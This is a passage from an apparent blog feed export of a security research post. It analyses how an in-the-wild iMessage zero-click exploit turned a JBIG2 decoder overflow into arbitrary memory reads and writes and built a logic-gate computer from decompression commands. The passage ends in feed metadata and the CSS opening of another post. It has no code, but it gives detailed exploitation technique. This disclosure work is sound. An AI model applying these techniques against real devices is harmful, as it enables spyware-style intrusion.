&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c6\"&gt;JBIG2Bitmaps&lt;/span&gt;&lt;span class=\"c5\"&gt;&amp;nbsp;are simple wrappers around a backing buffer, storing the buffer&amp;rsquo;s width and height (in bits) as well as a line value which defines how many bytes are stored for each line.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c4\"&gt;&lt;/p&gt;\n  \n &lt;p class=\"c4\"&gt;&lt;span class=\"c5\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0hdaagzsqy4Esf9vjf9KS6euQUhDYTUMu9xDO8q4nxUCbVjpLmxBCJkixLWpg8YETgQNC-2DYLlPss0Eo46knC-qDRI0dLEcOHPvjbwGfaF_E_7EimexamWDy68_id27V2y9k0J2moeJg94okQoOtrMyejAg7bYepIgtdcgNH7NRz7Ne-mWeWs1QA/s1070/image7%282%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0hdaagzsqy4Esf9vjf9KS6euQUhDYTUMu9xDO8q4nxUCbVjpLmxBCJkixLWpg8YETgQNC-2DYLlPss0Eo46knC-qDRI0dLEcOHPvjbwGfaF_E_7EimexamWDy68_id27V2y9k0J2moeJg94okQoOtrMyejAg7bYepIgtdcgNH7NRz7Ne-mWeWs1QA/s1070/image7%282%29.png\" border=\"0\" alt=\"\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c12\"&gt;&lt;span class=\"c9 c7\"&gt;The memory layout of the JBIG2Bitmap object showing the segnum, w, h and line fields which are corrupted during the overflow&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;By carefully structuring &lt;/span&gt;&lt;span class=\"c6\"&gt;refSegs&lt;/span&gt;&lt;span&gt;&amp;nbsp;they can stop the overflow after writing exactly three more &lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointers after the end of the &lt;/span&gt;&lt;span class=\"c6\"&gt;segments&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"c6\"&gt;GList&lt;/span&gt;&lt;span&gt;&amp;nbsp;buffer. This overwrites the vtable pointer and the first four fields of the &lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;representing the current page.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Due to the nature of the iOS address space layout these pointers are very likely to be in the second 4GB of virtual memory, with addresses between &lt;/span&gt;&lt;span class=\"c6\"&gt;0x100000000&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"c6\"&gt;0x1ffffffff&lt;/span&gt;&lt;span&gt;. Since all iOS hardware is little endian (meaning that the &lt;/span&gt;&lt;span class=\"c6\"&gt;w&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"c6\"&gt;line&lt;/span&gt;&lt;span&gt;&amp;nbsp;fields are likely to be overwritten with &lt;/span&gt;&lt;span class=\"c6\"&gt;0x1&lt;/span&gt;&lt;span&gt;&amp;nbsp;&amp;mdash; &lt;/span&gt;&lt;span&gt;the most-significant half of a &lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;pointer) and the &lt;/span&gt;&lt;span class=\"c6\"&gt;segNum&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"c6\"&gt;h&lt;/span&gt;&lt;span&gt;&amp;nbsp;fields are likely to be overwritten with the least-significant half of such a pointer, a fairly random value depending on heap layout and ASLR somewhere between &lt;/span&gt;&lt;span class=\"c6\"&gt;0x100000&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"c6\"&gt;0xffffffff&lt;/span&gt;&lt;span class=\"c5\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;This gives the current destination page &lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;an unknown, but very large, value for &lt;/span&gt;&lt;span class=\"c6\"&gt;h&lt;/span&gt;&lt;span&gt;. Since that &lt;/span&gt;&lt;span class=\"c6\"&gt;h&lt;/span&gt;&lt;span&gt;&amp;nbsp;value is used for bounds checking and is supposed to reflect the allocated size of the page backing buffer, this has the effect of &amp;quot;unbounding&amp;quot; the drawing canvas. This means that subsequent &lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2&lt;/span&gt;&lt;span class=\"c5\"&gt;&amp;nbsp;segment commands can read and write memory outside of the original bounds of the page backing buffer.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;The heap groom also places the current page&amp;#39;s backing buffer just below the undersized &lt;/span&gt;&lt;span class=\"c6\"&gt;syms&lt;/span&gt;&lt;span&gt;&amp;nbsp;buffer, such that when the page &lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;is unbounded, it&amp;#39;s able to &lt;/span&gt;&lt;span&gt;read and write&lt;/span&gt;&lt;span class=\"c5\"&gt;&amp;nbsp;its own fields:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c4\"&gt;&lt;hr style=\"page-break-before:always;display:none;\"&gt;&lt;/p&gt;\n\n &lt;p class=\"c4\"&gt;&lt;span class=\"c5\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidgMVssjmRf7_LhtPKH-MCSJdXOZk5t6EAm-FLazQh5ssP2ksV4kIlzxSIOGz5Elrm8ROuBz92K4-Jthwu4WYa8vN61EgdpB5dbtuCULDRFhqK1TkPOE8xl63p9MAIgf1dNwYKgkYMwlgoNEFcvdDmXy6GdlcRQ5ESrN8d3bAYIEse7dGPQc3cbo8h/s550/image5%282%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidgMVssjmRf7_LhtPKH-MCSJdXOZk5t6EAm-FLazQh5ssP2ksV4kIlzxSIOGz5Elrm8ROuBz92K4-Jthwu4WYa8vN61EgdpB5dbtuCULDRFhqK1TkPOE8xl63p9MAIgf1dNwYKgkYMwlgoNEFcvdDmXy6GdlcRQ5ESrN8d3bAYIEse7dGPQc3cbo8h/s550/image5%282%29.png\" border=\"0\" alt=\"\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c12\"&gt;&lt;span class=\"c9 c7\"&gt;The memory layout showing how the unbounded bitmap backing buffer is able to reference the JBIG2Bitmap object and modify fields in it as it is located after the backing buffer in memory&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;By rendering 4-byte bitmaps at the correct canvas coordinates they can write to all the fields of the page &lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span&gt;&amp;nbsp;and b&lt;/span&gt;&lt;span&gt;y carefully choosing new values for &lt;/span&gt;&lt;span class=\"c6\"&gt;w&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"c6\"&gt;h&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"c6\"&gt;line&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"c5\"&gt;they can write to arbitrary offsets from the page backing buffer.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c5\"&gt;At this point it would also be possible to write to arbitrary absolute memory addresses if you knew their offsets from the page backing buffer. But how to compute those offsets? Thus far, this exploit has proceeded in a manner very similar to a &amp;quot;canonical&amp;quot; scripting language exploit which in Javascript might end up with an unbounded ArrayBuffer object with access to memory. But in those cases the attacker has the ability to run arbitrary Javascript which can obviously be used to compute offsets and perform arbitrary computations. How do you do that in a single-pass image parser?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c14 c8\"&gt;My other compression format is turing-complete!&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c14 c8\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c5\"&gt;As mentioned earlier, the sequence of steps which implement JBIG2 refinement are very flexible. Refinement steps can reference both the output bitmap and any previously created segments, as well as render output to either the current page or a segment. By carefully crafting the context-dependent part of the refinement decompression, it&amp;#39;s possible to craft sequences of segments where only the refinement combination operators have any effect.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;In practice this means it is possible to apply the AND, OR, XOR and XNOR logical operators between memory regions at arbitrary offsets from the current page&amp;#39;s &lt;/span&gt;&lt;span class=\"c6\"&gt;JBIG2Bitmap&lt;/span&gt;&lt;span class=\"c5\"&gt;&amp;nbsp;backing buffer. And since that has been unbounded&amp;hellip; it&amp;#39;s possible to perform those logical operations on memory at arbitrary out-of-bounds offsets:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c4\"&gt;&lt;/p&gt;\n &lt;p class=\"c4\"&gt;&lt;span class=\"c5\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFkcS4JjzhV7pzJ5kVEmFj7WLW5Zzdc0JkYDaQBhVYIDayiYOksOID0LFOFGr9qQA44qwe3LRN9KNqOelKIflmcTDnR3k6qrtfvJ4wsoTDyuM59nmE6DGM_n_wOUMNY8HoLybtywIMq2-VdeFVwHHc9aDe0tkExa4hfvXKJ6o_m2QYT2LXp4NGDNJI/s551/image9%281%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjFkcS4JjzhV7pzJ5kVEmFj7WLW5Zzdc0JkYDaQBhVYIDayiYOksOID0LFOFGr9qQA44qwe3LRN9KNqOelKIflmcTDnR3k6qrtfvJ4wsoTDyuM59nmE6DGM_n_wOUMNY8HoLybtywIMq2-VdeFVwHHc9aDe0tkExa4hfvXKJ6o_m2QYT2LXp4NGDNJI/s551/image9%281%29.png\" border=\"0\" alt=\"\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c12\"&gt;&lt;span class=\"c9 c7\"&gt;The memory layout showing how logical operators can be applied out-of-bounds&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c5\"&gt;It&amp;#39;s when you take this to its most extreme form that things start to get really interesting. What if rather than operating on glyph-sized sub-rectangles you instead operated on single bits?&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c8\"&gt;You can now provide as input a sequence of JBIG2 segment commands which implement a sequence of logical bit operations to apply to the page. And since the page buffer has been unbounded those bit operations can operate on arbitrary memory.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;With a bit of back-of-the-envelope scribbling you can convince yourself that with just the available AND, OR, XOR and XNOR logical&lt;/span&gt;&lt;span&gt;&amp;nbsp;operators&lt;/span&gt;&lt;span&gt;&amp;nbsp;you can in fact compute &lt;/span&gt;&lt;span class=\"c7\"&gt;any&lt;/span&gt;&lt;span class=\"c5\"&gt;&amp;nbsp;computable function - the simplest proof being that you can create a logical NOT operator by XORing with 1 and then putting an AND gate in front of that to form a NAND gate:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c4\"&gt;&lt;/p&gt;\n\n &lt;p class=\"c4\"&gt;&lt;span class=\"c5\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjBpKF2iKJhndHIFtGm9xUBVjpXOM4GYcwSdNyfuUvwI-883zmbnhi_Ch6CR4XEaA6D2uaGkU3g8rNocZS_ZlWXD8rTSRGTgYact6ar43k8ywMZG6hnjDz8Yr3pC3Fh4W3dggIA_XriPw1Vc6myG-18TPe8Ffj_NGuywLqz4tpdlrbMAso-CBZcM_4X/s265/image8%282%29.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjBpKF2iKJhndHIFtGm9xUBVjpXOM4GYcwSdNyfuUvwI-883zmbnhi_Ch6CR4XEaA6D2uaGkU3g8rNocZS_ZlWXD8rTSRGTgYact6ar43k8ywMZG6hnjDz8Yr3pC3Fh4W3dggIA_XriPw1Vc6myG-18TPe8Ffj_NGuywLqz4tpdlrbMAso-CBZcM_4X/s265/image8%282%29.png\" border=\"0\" alt=\"\" style=\"max-height: 750px; max-width: 600px;\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c12\"&gt;&lt;span class=\"c9 c7\"&gt;An AND gate connected to one input of an XOR gate. The other XOR gate input is connected to the constant value 1 creating an NAND.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c1\"&gt;&lt;span class=\"c9 c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;A NAND gate is an example of a universal logic gate; one from which all other gates can be built and from which a circuit can be &lt;/span&gt;&lt;span class=\"c16\"&gt;&lt;a class=\"c21\" href=\"https://www.nand2tetris.org/\"&gt;built to compute any computable function&lt;/a&gt;&lt;/span&gt;&lt;span class=\"c5\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c14 c8\"&gt;Practical circuits&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;JBIG2 doesn&amp;#39;t have scripting capabilities, but when combined with a vulnerability, it does have the ability to emulate circuits of arbitrary logic gates operating on arbitrary memory. So why not just use that to build your &lt;/span&gt;&lt;span class=\"c7\"&gt;own&lt;/span&gt;&lt;span&gt;&amp;nbsp;computer architecture and script that!? That&amp;#39;s exactly what this exploit does. Using over 70,000 segment commands defining logical bit operations, they define a small computer architecture with features such as registers and a full 64-bit adder and comparator which they use to search memory and perform arithmetic operations. It&amp;#39;s not as fast as Javascript, but it&amp;#39;s fundamentally computationally equivalent&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span class=\"c5\"&gt;The bootstrapping operations for the sandbox escape exploit are written to run on this logic circuit and the whole thing runs in this weird, emulated environment created out of a single decompression pass through a JBIG2 stream. It&amp;#39;s pretty incredible, and at the same time, pretty terrifying.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c10\"&gt;&lt;span class=\"c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3\"&gt;&lt;span&gt;In a future post (currently being finished),&lt;/span&gt;&lt;span&gt;&amp;nbsp;we&amp;#39;ll take a look at exactly how they escape the &lt;/span&gt;&lt;span class=\"c6\"&gt;IMTranscoderAgent&lt;/span&gt;&lt;span&gt;&amp;nbsp;sandbox.&lt;/span&gt;&lt;/p&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/5073082417618502919/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/5073082417618502919"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/5073082417618502919"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2021/12/a-deep-dive-into-nso-zero-click.html","@title":"A deep dive into an NSO zero-click iMessage exploit: Remote Code Execution"}],"author":{"name":"Ryan","uri":"http://www.blogger.com/profile/17011901605865574886","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"media:thumbnail":{"@xmlns:media":"http://search.yahoo.com/mrss/","@url":"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhvP0VlEQXC6TZWOu-zPOWC-Pnyy3uqOJpwPeP3Y_rz-ZO_MvrqjiMtMwxzIz_E8NdNyrV_Fvx-RRApoMxAPrYQcHO4eiico20He9zMm3UT5-j84CCRZDJq5hjMmeIKd0aLMsflCkfrfVHp1z1PbQmYPFX6UlVtn6_gF8P6iTQaAHL3EQ6iKs4VDdEZ/s72-c/image2%281%29.jpg","@height":"72","@width":"72"},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-7868790017880077590","published":"2021-12-01T10:38:00.002-08:00","updated":"2021-12-01T14:27:11.840-08:00","title":{"@type":"text","#text":"This shouldn't have happened: A vulnerability postmortem"},"content":{"@type":"html","#text":"&lt;style type=\"text/css\"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=t66UaDGGO9uRFa9A_n0Ge4kPz49mG1-u2NJpkhDAP5E');.lst-kix_q4elz23jmthh-5&gt;li{counter-increment:lst-ctn-kix_q4elz23jmthh-5}ol.lst-kix_q4elz23jmthh-6.start{counter-reset:lst-ctn-kix_q4elz23jmthh-6 0}ul.lst-kix_wy7koemfbmv1-3{list-style-type:none}ul.lst-kix_wy7koemfbmv1-2{list-style-type:none}ul.lst-kix_wy7koemfbmv1-5{list-style-type:none}.lst-kix_2hgb22nra90i-8&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_wy7koemfbmv1-4{list-style-type:none}ul.lst-kix_wy7koemfbmv1-1{list-style-type:none}.lst-kix_2hgb22nra90i-7&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_wy7koemfbmv1-0{list-style-type:none}ol.lst-kix_q4elz23jmthh-0.start{counter-reset:lst-ctn-kix_q4elz23jmthh-0 0}.lst-kix_2hgb22nra90i-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_2hgb22nra90i-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_2hgb22nra90i-5&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_z8xtsan2wa5s-5{list-style-type:none}ul.lst-kix_z8xtsan2wa5s-6{list-style-type:none}.lst-kix_q4elz23jmthh-7&gt;li{counter-increment:lst-ctn-kix_q4elz23jmthh-7}ul.lst-kix_z8xtsan2wa5s-7{list-style-type:none}ul.lst-kix_z8xtsan2wa5s-8{list-style-type:none}.lst-kix_2hgb22nra90i-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_2hgb22nra90i-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_2hgb22nra90i-3&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_z8xtsan2wa5s-0{list-style-type:none}ul.lst-kix_z8xtsan2wa5s-1{list-style-type:none}ul.lst-kix_wy7koemfbmv1-7{list-style-type:none}ul.lst-kix_z8xtsan2wa5s-2{list-style-type:none}ul.lst-kix_wy7koemfbmv1-6{list-style-type:none}ul.lst-kix_z8xtsan2wa5s-3{list-style-type:none}ul.lst-kix_z8xtsan2wa5s-4{list-style-type:none}.lst-kix_2hgb22nra90i-1&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_wy7koemfbmv1-8{list-style-type:none}.lst-kix_q4elz23jmthh-5&gt;li:before{content:\"\" counter(lst-ctn-kix_q4elz23jmthh-5,lower-roman) \". \"}.lst-kix_q4elz23jmthh-6&gt;li:before{content:\"\" counter(lst-ctn-kix_q4elz23jmthh-6,decimal) \". \"}.lst-kix_q4elz23jmthh-4&gt;li:before{content:\"\" counter(lst-ctn-kix_q4elz23jmthh-4,lower-latin) \". \"}.lst-kix_q4elz23jmthh-8&gt;li:before{content:\"\" counter(lst-ctn-kix_q4elz23jmthh-8,lower-roman) \". \"}.lst-kix_oetzaqvyxxoa-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_oetzaqvyxxoa-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_oetzaqvyxxoa-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_oetzaqvyxxoa-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_q4elz23jmthh-7&gt;li:before{content:\"\" counter(lst-ctn-kix_q4elz23jmthh-7,lower-latin) \". \"}.lst-kix_q4elz23jmthh-0&gt;li:before{content:\"\" counter(lst-ctn-kix_q4elz23jmthh-0,decimal) \". \"}.lst-kix_q4elz23jmthh-1&gt;li:before{content:\"\" counter(lst-ctn-kix_q4elz23jmthh-1,lower-latin) \". \"}.lst-kix_q4elz23jmthh-2&gt;li:before{content:\"\" counter(lst-ctn-kix_q4elz23jmthh-2,lower-roman) \". \"}.lst-kix_q4elz23jmthh-3&gt;li{counter-increment:lst-ctn-kix_q4elz23jmthh-3}.lst-kix_q4elz23jmthh-3&gt;li:before{content:\"\" counter(lst-ctn-kix_q4elz23jmthh-3,decimal) \". \"}ul.lst-kix_ohd9cwgi2ci1-5{list-style-type:none}ul.lst-kix_ohd9cwgi2ci1-4{list-style-type:none}ul.lst-kix_ohd9cwgi2ci1-7{list-style-type:none}ul.lst-kix_ohd9cwgi2ci1-6{list-style-type:none}ul.lst-kix_ohd9cwgi2ci1-8{list-style-type:none}ul.lst-kix_ugjdqlaeq7aq-2{list-style-type:none}ul.lst-kix_ugjdqlaeq7aq-3{list-style-type:none}.lst-kix_oetzaqvyxxoa-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_oetzaqvyxxoa-7&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_ugjdqlaeq7aq-0{list-style-type:none}ul.lst-kix_ugjdqlaeq7aq-1{list-style-type:none}ol.lst-kix_q4elz23jmthh-5.start{counter-reset:lst-ctn-kix_q4elz23jmthh-5 0}ul.lst-kix_ugjdqlaeq7aq-6{list-style-type:none}ul.lst-kix_ugjdqlaeq7aq-7{list-style-type:none}.lst-kix_oetzaqvyxxoa-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_oetzaqvyxxoa-5&gt;li:before{content:\"\\0025a0  \"}.lst-kix_oetzaqvyxxoa-8&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_ugjdqlaeq7aq-4{list-style-type:none}ul.lst-kix_ugjdqlaeq7aq-5{list-style-type:none}ul.lst-kix_ugjdqlaeq7aq-8{list-style-type:none}.lst-kix_x7i5vtjupm2f-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_x7i5vtjupm2f-6&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_2fd9br43vo52-4{list-style-type:none}ul.lst-kix_2fd9br43vo52-3{list-style-type:none}.lst-kix_ohd9cwgi2ci1-3&gt;li:before{content:\"\\0025cf  \"}ul.lst-kix_2fd9br43vo52-6{list-style-type:none}ul.lst-kix_2fd9br43vo52-5{list-style-type:none}ul.lst-kix_2fd9br43vo52-8{list-style-type:none}.lst-kix_fvn7czyjg1wz-2&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_2fd9br43vo52-7{list-style-type:none}.lst-kix_x7i5vtjupm2f-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_2fd9br43vo52-3&gt;li:before{content:\"\\0025cf  \"}.lst-kix_fvn7czyjg1wz-4&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_2fd9br43vo52-0{list-style-type:none}.lst-kix_2fd9br43vo52-5&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_2fd9br43vo52-2{list-style-type:none}ul.lst-kix_2fd9br43vo52-1{list-style-type:none}.lst-kix_4idwybng3hbx-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_2fd9br43vo52-7&gt;li:before{content:\"\\0025cb  \"}.lst-kix_fvn7czyjg1wz-8&gt;li:before{content:\"\\0025a0  \"}.lst-kix_ohd9cwgi2ci1-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_4idwybng3hbx-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_fvn7czyjg1wz-6&gt;li:before{content:\"\\0025cf  \"}.lst-kix_x7i5vtjupm2f-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_ugjdqlaeq7aq-8&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_fvn7czyjg1wz-2{list-style-type:none}ul.lst-kix_fvn7czyjg1wz-1{list-style-type:none}ul.lst-kix_fvn7czyjg1wz-0{list-style-type:none}.lst-kix_wy7koemfbmv1-4&gt;li:before{content:\"\\0025cb  \"}.lst-kix_ugjdqlaeq7aq-6&gt;li:before{content:\"\\0025cf  \"}ol.lst-kix_q4elz23jmthh-7.start{counter-reset:lst-ctn-kix_q4elz23jmthh-7 0}.lst-kix_wy7koemfbmv1-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_wy7koemfbmv1-2&gt;li:before{content:\"\\0025a0  \"}.lst-kix_ugjdqlaeq7aq-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_ohd9cwgi2ci1-5&gt;li:before{content:\"\\0025cf  \"}.lst-kix_ohd9cwgi2ci1-7&gt;li:before{content:\"\\0025cf  \"}.lst-kix_2fd9br43vo52-1&gt;li:before{content:\"\\0025cb  \"}.lst-kix_ugjdqlaeq7aq-2&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_2hgb22nra90i-0{list-style-type:none}ul.lst-kix_2hgb22nra90i-1{list-style-type:none}ul.lst-kix_2hgb22nra90i-2{list-style-type:none}ul.lst-kix_2hgb22nra90i-3{list-style-type:none}.lst-kix_fvn7czyjg1wz-0&gt;li:before{content:\"\\0025cf  \"}.lst-kix_ugjdqlaeq7aq-4&gt;li:before{content:\"\\0025cb  \"}ul.lst-kix_2hgb22nra90i-4{list-style-type:none}ul.lst-kix_2hgb22nra90i-5{list-style-type:none}ul.lst-kix_fvn7czyjg1wz-8{list-style-type:none}ul.lst-kix_2hgb22nra90i-6{list-style-type:none}ul.lst-kix_fvn7czyjg1wz-7{list-style-type:none}ul.lst-kix_2hgb22nra90i-7{list-style-type:none}ul.lst-kix_fvn7czyjg1wz-6{list-style-type:none}ul.lst-kix_2hgb22nra90i-8{list-style-type:none}ul.lst-kix_fvn7czyjg1wz-5{list-style-type:none}ul.lst-kix_fvn7czyjg1wz-4{list-style-type:none}.lst-kix_x7i5vtjupm2f-8&gt;li:before{content:\"\\0025a0  \"}ul.lst-kix_fvn7czyjg1wz-3{list-style-type:none}ul.lst-kix_81cegzboe9ky-8{list-style-type:none}ul.lst-kix_81cegzboe9ky-5{list-style-type:none}ul.lst-kix_81cegzboe9ky-4{list-style-type:none}ul.lst-kix_81cegzboe9ky-7{list-style-type:none}ul.lst-kix_81cegzboe9ky-6{list-style-type:none}ol.lst-kix_q4elz23jmthh-8.start{counter-reset:lst-ctn-kix_q4elz23jmthh-8 